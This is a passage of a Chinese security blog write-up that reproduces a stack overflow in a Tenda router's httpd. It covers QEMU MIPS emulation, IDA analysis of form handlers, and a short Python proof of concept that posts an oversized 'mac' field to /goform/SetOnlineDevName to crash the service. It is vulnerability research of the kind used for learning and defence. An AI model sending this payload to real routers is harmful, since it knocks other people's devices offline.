class="hljs-string">&quot;<span class="hljs-variable">$&#123;required_files[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        missing_files+=(<span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>)<br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;#missing_files[@]&#125;</span> -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：以下文件缺失:&quot;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27; - %s\n&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;missing_files[@]&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 5. 启动虚拟机</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在启动QEMU虚拟机...&quot;</span><br>./<span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>启动完成我们就要配置网络了，实现主机虚拟机通信</p>
+<p>配置网卡</p>
+<p><strong>1. 在宿主机创建 TAP 设备</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ROUTEROS">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span> dev tap0 mode tap<br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> tap0 up<br>sudo<span class="hljs-built_in"> ip </span>addr <span class="hljs-built_in">add</span> 10.10.10.1/24 dev tap0<br><br><br></code></pre></td></tr></table></figure>
+
+<p><strong>2. 在虚拟机内配置 IP</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ROUTEROS">ip addr <span class="hljs-built_in">add</span> 10.10.10.2/24 dev eth0 <span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">set</span> eth0 up<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">add</span> br0<span class="hljs-built_in"> type </span>dummy<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>addr <span class="hljs-built_in">add</span> 10.10.10.3/24 dev br0  <span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">set</span> br0 up<br><br><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220001392.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220001392.png" srcset="/img/loading.gif" lazyload alt="image-20250403220001392"></a></p>
+<p>把文件系统打包一下，然后用http服务发送到虚拟机</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220113012.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220113012.png" srcset="/img/loading.gif" lazyload alt="image-20250403220113012"></a></p>
+<p>虚拟机这边用wget下载一下，解压文件系统</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220234903.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220234903.png" srcset="/img/loading.gif" lazyload alt="image-20250403220234903"></a></p>
+<p>然后运行启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">chroot</span> . sh<br>./bin/httpd<br><br>BASH<br></code></pre></td></tr></table></figure>
+
+<p>直接访问10.10.10.3:80也能出现WEB界面</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403233420135.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403233420135.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>由于我们终端运行着WEB服务，要看输出信息，所有我们可以连一个SSH以执行其他命令</p>
+<h2 id="06逆向分析与漏洞复现"><a href="#06逆向分析与漏洞复现" class="headerlink" title="06逆向分析与漏洞复现"></a>06逆向分析与漏洞复现</h2><p>用IDA打开httpd分析一下</p>
+<p>再<code>initWebs</code>是初始话web界面，并根据提交表单调用相应功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">initWebs</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// $v0</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// $v0</span><br>  <span class="hljs-type">char</span> *cp; <span class="hljs-comment">// [sp+30h] [+30h]</span><br>  in_addr intaddr; <span class="hljs-comment">// [sp+34h] [+34h] BYREF</span><br>  <span class="hljs-type">char</span> host[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+38h] [+38h] BYREF</span><br>  <span class="hljs-type">char</span> webdir[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+B8h] [+B8h] BYREF</span><br>  <span class="hljs-type">char_t</span> wbuf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+138h] [+138h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(wbuf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(wbuf));<br>  doSystemCmd(<span class="hljs-string">&quot;echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps&quot;</span>);<br>  socketOpen();<br>  inet_aton(g_lan_ip, &amp;intaddr);<br>  <span class="hljs-built_in">strcpy</span>(webdir, rootWeb);<br>  websSetDefaultDir(webdir);<br>  cp = inet_ntoa(intaddr);<br>  v0 = <span class="hljs-built_in">strlen</span>(cp) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-number">0x80</span> )<br>    v0 = <span class="hljs-number">0x80</span>;<br>  ascToUni(wbuf, cp, v0);<br>  websSetIpaddr(wbuf);<br>  v1 = <span class="hljs-built_in">strlen</span>(host) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x80</span> )<br>    v1 = <span class="hljs-number">0x80</span>;<br>  ascToUni(wbuf, host, v1);<br>  websSetHost(wbuf);<br>  websSetDefaultPage(<span class="hljs-string">&quot;index.html&quot;</span>);<br>  websSetPassword(password);<br>  <span class="hljs-keyword">if</span> ( websOpenServer(port, retries) &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    websUrlHandlerDefine(byte_46FC3C, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, R7WebsSecurityHandler, <span class="hljs-number">1</span>);<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/goform&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websFormHandler, <span class="hljs-number">0</span>);<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/cgi-bin&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, webs_Tenda_CGI_BIN_Handler, <span class="hljs-number">0</span>);<br>    websUrlHandlerDefine(byte_46FC3C, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websDefaultHandler, <span class="hljs-number">2</span>);<br>    formDefineTendDa();<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websHomePageHandler, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d: websOpenServer failed\n&quot;</span>, <span class="hljs-string">&quot;initWebs&quot;</span>, <span class="hljs-number">0x1D0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>;<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>在<code>formDefineTendDa</code>函数中就是各个表单调用的程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">formDefineTendDa</span><span class="hljs-params">()</span><br>&#123;<br>  websAspDefine(<span class="hljs-string">&quot;aspGetCharset&quot;</span>, aspGetCharset);<br>  websFormDefine(<span class="hljs-string">&quot;getOnlineList&quot;</span>, formGetOnlineList);<br>  websAspDefine(<span class="hljs-string">&quot;asp_error_message&quot;</span>, asp_error_message);<br>  websAspDefine(<span class="hljs-string">&quot;asp_error_redirect_url&quot;</span>, asp_error_redirect_url);<br>  websFormDefine(<span class="hljs-string">&quot;SetOnlineDevName&quot;</span>, formSetDeviceName);<br>  websFormDefine(<span class="hljs-string">&quot;setBlackRule&quot;</span>, formAddMacfilterRule);<br>  websFormDefine(<span class="hljs-string">&quot;delBlackRule&quot;</span>, formDelMacfilterRule);<br>  websFormDefine(<span class="hljs-string">&quot;getBlackRuleList&quot;</span>, formGetMacfilterRuleList);<br>  websFormDefine(<span class="hljs-string">&quot;getDeviceInfo&quot;</span>, formGetDeviceInfo);<br>  websFormDefine(<span class="hljs-string">&quot;telnet&quot;</span>, TendaTelnet);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolReboot&quot;</span>, fromSysToolReboot);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolRestoreSet&quot;</span>, fromSysToolRestoreSet);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolChangePwd&quot;</span>, fromSysToolChangePwd);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolSetUpgrade&quot;</span>, fromSysToolSetUpgrade);<br>  websFormDefine(<span class="hljs-string">&quot;WifiBasicGet&quot;</span>, formWifiBasicGet);<br>  websFormDefine(<span class="hljs-string">&quot;WifiBasicSet&quot;</span>, formWifiBasicSet);<br>  websFormDefine(<span class="hljs-string">&quot;WifiApScan&quot;</span>, formWifiApScan);<br>  websFormDefine(<span class="hljs-string">&quot;ate&quot;</span>, TendaAte);<br>  websFormDefine(<span class="hljs-string">&quot;setApModeCfg&quot;</span>, fromsetApModeCfg);<br>  websFormDefine(<span class="hljs-string">&quot;getApModeCfg&quot;</span>, fromgetApModeCfg);<br>  websFormDefine(<span class="hljs-string">&quot;WifiExtraSet&quot;</span>, fromSetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;getQuicksetBridge&quot;</span>, fromGetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;getStatusBeforeBridge&quot;</span>, fromGetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;exit&quot;</span>, formExit);<br>  websFormDefine(<span class="hljs-string">&quot;hasLoginPwd&quot;</span>, formhasLoginPwd);<br>  websFormDefine(<span class="hljs-string">&quot;loginOut&quot;</span>, fromLoginOut);<br>  websFormDefine(<span class="hljs-string">&quot;sysToolsInfo&quot;</span>, fromSysToolsInfo);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>根据大佬的话说就是多关注带有set的功能，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险</p>
+<p>分析处理<code>SetOnlineDevName</code> 请求的<code>formSetDeviceName</code> 函数，其中的<code>set_device_name</code>发现漏洞</p>
+<p>没有对字符串长度校验，使用<code>sprintf</code>会造成栈溢出漏洞导致程序崩溃</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403234633289.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403234633289.png" srcset="/img/loading.gif" lazyload alt="image-20250403234633289"></a></p>
+<p>写一个POC测试一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Date    : 2025-04-03 17:12:39</span><br><span class="hljs-comment"># @Author  : Your Name (you@example.org)</span><br><span class="hljs-comment"># @Link    : http://example.org</span><br><span class="hljs-comment"># @Version : $Id$</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br>ip = <span class="hljs-string">&#x27;10.10.10.3&#x27;</span><br><br>url =  <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;ip&#125;</span>/goform/SetOnlineDevName&#x27;</span><br><br>payload = &#123;<br>  <span class="hljs-string">&quot;mac&quot;</span>: <span class="hljs-string">&#x27;00:0c:29:5f:4d:3c&#x27;</span> * <span class="hljs-number">0x100</span>,<br>  <span class="hljs-string">&quot;devName&quot;</span>: <span class="hljs-string">&#x27;devname1&#x27;</span><br>&#125;<br><br>res = requests.post(url=url , data=payload)<br><span class="hljs-built_in">print</span>(res.content)<br><br><br></code></pre></td></tr></table></figure>
+
+<p>但是和我们预想的不一样</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235024376.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235024376.png" srcset="/img/loading.gif" lazyload alt="image-20250403235024376"></a></p>
+<p>发现程序并没有崩溃，还打印了信息**device name setted failed!*<em>和*<em>set device name error!</em></em></p>
+<p>进入IDA定位一下执行位置，发现进入下边这个分支</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235342842.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235342842.png" srcset="/img/loading.gif" lazyload alt="image-20250403235342842"></a></p>
+<p>是应为调用<code>tpi_set_mac_info</code>这个外部函数是进行写入<code>nvram</code> 设备的操作，但是我们用qemu模拟的就会调用失败，进入这个分支，所有我们可以改变一下程序的执行流，用IDA进行patch一下，直接把跳转指令nop掉就达到我们的目的了</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235921306.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235921306.png" srcset="/img/loading.gif" lazyload alt="image-20250403235921306"></a></p>
+<p>patch成功，传入mips虚拟机运行</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000347583.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000347583.png" srcset="/img/loading.gif" lazyload alt="image-20250404000347583"></a></p>
+<p>再次发从POC程序崩溃</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000707382.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000707382.png" srcset="/img/loading.gif" lazyload alt="image-20250404000707382"></a></p>
+<p>至此漏洞复现工作完成，虽然比较简单，但是还是学到很多东西</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/IOT%E5%AE%89%E5%85%A8/" class="category-chain-item">IOT安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/11/WEB%E5%85%A5%E9%97%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="WEB入门之文件上传">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WEB入门之文件上传</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/22/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="非栈上格式化字符串漏洞利用">
+                        <span class="hidden-mobile">非栈上格式化字符串漏洞利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>P0ach1l</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
